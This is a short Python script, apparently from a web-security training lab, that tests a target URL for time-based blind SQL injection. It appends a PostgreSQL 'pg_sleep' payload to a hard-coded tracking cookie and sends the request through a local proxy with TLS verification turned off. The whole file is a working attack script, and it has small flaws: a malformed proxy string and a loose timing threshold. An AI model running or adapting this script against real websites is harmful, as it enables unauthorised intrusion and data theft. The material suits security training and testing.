import requests
import urllib
import urllib3
import sys

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http':'http:127.0.0.1:8080','https':'https://127.0.0.1:8080'}



def blind_sqli_check(url):
    sqli_payload = "' || (SELECT pg_sleep(10))--"
    sqli_payload_encoded = urllib.parse.quote(sqli_payload)
    cookies = {'TrackingID':'78HPQpUI8j12cCIi'+sqli_payload_encoded, 'session':'hT3ucoEE3DSaX9MIyoNW4vcFn5tcIdzc'}
    r = requests.get(url, cookies=cookies, verify=False, proxies=proxies)
    if int(r.elapsed.total_seconds()) > 1:
        print("(+) Vulnerable to blind-based SQL injection")
    else:
        print("(-) Not vulnerable to blind based SQL injection")


def main():
    if len(sys.argv) != 2:
        print("(+) Usage: %s <url>" % sys.argv[0])
        print("(+) Example: %s www.example.com" % sys.argv[0])
        sys.exit(-1)

    url = sys.argv[1]
    print("(+) Checking if tracking cookie is vulnerable to time-based blind SQLinjection...")
    blind_sqli_check(url)

if __name__ == "__main__":
    main()